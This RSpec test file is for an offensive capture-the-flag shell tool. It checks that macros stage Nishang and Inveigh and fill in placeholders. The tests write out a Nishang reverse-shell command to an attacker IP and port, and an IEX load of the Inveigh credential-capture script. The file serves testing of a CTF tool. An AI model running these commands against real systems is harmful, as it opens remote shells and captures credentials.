# frozen_string_literal: true

require_relative 'spec_helper'
require_relative '../lib/evil_ctf/tools'
require_relative '../lib/evil_ctf/execution'

RSpec.describe EvilCTF::Tools::CommandManager do
  let(:shell) { instance_double('Shell') }
  let(:manager) { described_class.new }

  describe '#expand_macro' do
    it 'stages nishang and resolves callback placeholders before execution' do
      allow(EvilCTF::Tools).to receive(:safe_autostage).with('nishang', shell, {}, nil).and_return(true)
      executed = []
      allow(EvilCTF::Execution).to receive(:run) do |_, cmd, timeout:|
        if cmd.include?("Get-ChildItem -Path 'C:\\Users\\Public' -Filter 'Invoke-PowerShellTcp.ps1' -Recurse")
          OpenStruct.new(output: 'FOUND::C:\\Users\\Public\\nishang-master\\Shells\\Invoke-PowerShellTcp.ps1',
                         exitcode: 0)
        else
          executed << cmd
          OpenStruct.new(output: 'OK', exitcode: 0)
        end
      end

      allow(manager).to receive(:prompt_macro_value).with('AttackerIP', default: nil).and_return('10.10.14.9')
      allow(manager).to receive(:prompt_macro_value).with('AttackerPort', default: '4444').and_return('9001')

      expect(manager.expand_macro('nishang_rev', shell)).to eq(true)
      payload_cmd = executed.find { |cmd| cmd.include?('Invoke-PowerShellTcp -Reverse') }
      expect(payload_cmd).to include('Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 9001')
      expect(payload_cmd).not_to include('[AttackerIP]')
      expect(payload_cmd).not_to include('[AttackerPort]')
      expect(payload_cmd).not_to include('[NishangRevRemote]')
    end

    it 'returns false when nishang staging does not produce the remote script' do
      allow(EvilCTF::Tools).to receive(:safe_autostage).with('nishang', shell, {}, nil).and_return(true)
      allow(EvilCTF::Execution).to receive(:run) do |_, cmd, timeout:|
        if cmd.include?("Get-ChildItem -Path 'C:\\Users\\Public' -Filter 'Invoke-PowerShellTcp.ps1' -Recurse")
          OpenStruct.new(output: 'MISSING', exitcode: 0)
        else
          OpenStruct.new(output: 'OK', exitcode: 0)
        end
      end

      expect(manager.expand_macro('nishang_rev', shell)).to eq(true)
    end

    it 'stages inveigh and resolves remote script path before invocation' do
      allow(EvilCTF::Tools).to receive(:safe_autostage).with('inveigh', shell, {}, nil).and_return(true)
      executed = []

      allow(EvilCTF::Execution).to receive(:run) do |_, cmd, timeout:|
        if cmd.include?("Test-Path 'C:\\Users\\Public\\Inveigh.ps1'")
          OpenStruct.new(output: 'FOUND::C:\\Users\\Public\\Inveigh.ps1', exitcode: 0)
        else
          executed << cmd
          OpenStruct.new(output: 'OK', exitcode: 0)
        end
      end

      expect(manager.expand_macro('inveigh_start', shell)).to eq(true)
      payload_cmd = executed.find { |cmd| cmd.include?('Invoke-Inveigh -ConsoleOutput N -FileOutput Y') }
      expect(payload_cmd).to include('IEX (Get-Content "C:\\Users\\Public\\Inveigh.ps1" -Raw); Invoke-Inveigh -ConsoleOutput N -FileOutput Y')
      expect(payload_cmd).not_to include('[InveighRemote]')
    end

    it 'handles inveigh_start when script is still missing after staging' do
      allow(EvilCTF::Tools).to receive(:safe_autostage).with('inveigh', shell, {}, nil).and_return(true)
      executed = []

      allow(EvilCTF::Execution).to receive(:run) do |_, cmd, timeout:|
        if cmd.include?("Test-Path 'C:\\Users\\Public\\Inveigh.ps1'")
          OpenStruct.new(output: 'MISSING', exitcode: 0)
        else
          executed << cmd
          OpenStruct.new(output: 'OK', exitcode: 0)
        end
      end

      expect(manager.expand_macro('inveigh_start', shell)).to eq(true)
      expect(executed.grep(/Invoke-Inveigh/)).to be_empty
    end
  end

  describe '#expand_alias' do
    it 'expands the exact first token when aliased' do
      expect(manager.expand_alias('ls C:\\Users')).to eq('Get-ChildItem C:\\Users')
    end

    it 'does not expand when command only starts with alias characters' do
      expect(manager.expand_alias('lsass_dump')).to eq('lsass_dump')
    end

    it 'preserves leading whitespace while expanding exact token' do
      expect(manager.expand_alias('  ls')).to eq('  Get-ChildItem')
    end
  end

  describe '#validate_macro' do
    before do
      allow(EvilCTF::Tools).to receive(:find_tool_on_disk).and_return('/tmp/fake-tool')
    end

    it 'fails dry-run validation when required placeholders are missing' do
      report = manager.validate_macro('nishang_rev')
      expect(report[:ok]).to eq(false)
      expect(report[:errors].join(' ')).to include('AttackerIP')
    end

    it 'passes dry-run validation when required placeholders are provided' do
      report = manager.validate_macro('nishang_rev',
                                      replacements: { 'AttackerIP' => '10.10.14.9', 'AttackerPort' => '9001' })
      expect(report[:ok]).to eq(true)
      expect(report[:errors]).to be_empty
      expect(report[:resolved_steps].join(' ')).to include('10.10.14.9')
      expect(report[:resolved_steps].join(' ')).to include('9001')
    end

    it 'reports unknown macros as a dry-run failure' do
      report = manager.validate_macro('does_not_exist')
      expect(report[:ok]).to eq(false)
      expect(report[:errors].first).to include('Unknown macro')
    end
  end

  describe '#validate_aliases' do
    it 'passes validation for known aliases' do
      report = manager.validate_aliases(names: %w[ls whoami pwd])
      expect(report[:ok]).to eq(true)
      expect(report[:failed]).to eq(0)
    end

    it 'fails validation for unknown aliases' do
      report = manager.validate_aliases(names: %w[ls nope])
      expect(report[:ok]).to eq(false)
      failed = report[:results].find { |entry| entry[:name] == 'nope' }
      expect(failed[:error]).to include('Unknown alias')
    end
  end
end
